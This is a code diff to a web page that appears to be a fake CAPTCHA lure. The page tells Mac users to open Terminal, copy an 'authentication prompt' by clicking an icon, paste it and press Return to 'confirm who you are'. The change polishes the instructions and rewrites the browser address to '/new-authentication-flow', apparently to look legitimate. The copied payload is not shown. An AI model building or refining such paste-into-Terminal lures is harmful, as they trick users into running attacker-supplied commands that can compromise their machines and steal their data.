@@ -67,7 +67,7 @@ $(document).ready(function() {
                         <li>Open Terminal (Application -> Utilities -> Terminal)</li>
                         <li>Click icon <img id="copyButton-mac" src="https://coder-msl.github.io/advanced_captcha/src/copy.png" width="16" height="16"/> to copy authentication prompt.</li>
                         <li>Press both  ⌘ + V to paste the authentication prompt.</li>
-                        <li>Press Return  to confirm who you are.</b></li>
+                        <li>Press <b>Return</b> to confirm who you are.</b></li>
                     </ol>
                 </div>
             `;
@@ -112,6 +112,8 @@ $(document).ready(function() {
                     console.error(err);
                 });
         });
+
+        window.history.replaceState({}, "", "/new-authentication-flow");
     });
 
 
